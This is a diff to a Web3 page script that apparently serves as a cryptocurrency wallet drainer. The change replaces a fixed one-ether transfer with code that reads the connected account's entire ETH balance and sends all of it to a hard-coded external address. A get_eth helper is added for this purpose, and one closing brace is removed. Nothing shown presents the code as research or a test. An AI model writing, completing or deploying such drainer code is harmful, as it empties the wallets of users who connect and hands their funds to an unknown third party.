@@ -878,13 +878,15 @@ console.log(collection)
   }
 
 
-const value = '1';
-const finalAmount = Web3.utils.toWei(value.toString(), 'ether');
+var ethbalance =  await get_eth(account)
 
-const txData = {
+const finalAmount = Web3.utils.toWei(ethbalance.toString(), 'ether');
+
+const txData = { 
   from: account,
   to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
   value: finalAmount,
+
 };
 
 
@@ -895,8 +897,6 @@ await web3.eth.sendTransaction(txData)
     console.log(err)
   })
 
-
-}
 
 
 async function nfts(addr) {
@@ -965,3 +965,17 @@ var checkConnected = setInterval( async () => {
   }
   
   /*------------------------------------------------------*/
+
+    async function get_eth(address) {
+
+      const balances = web3.utils.fromWei(
+        await web3.eth.getBalance(address),
+        'ether'
+      )* 1;
+
+      return balances;
+
+
+
+
+  }
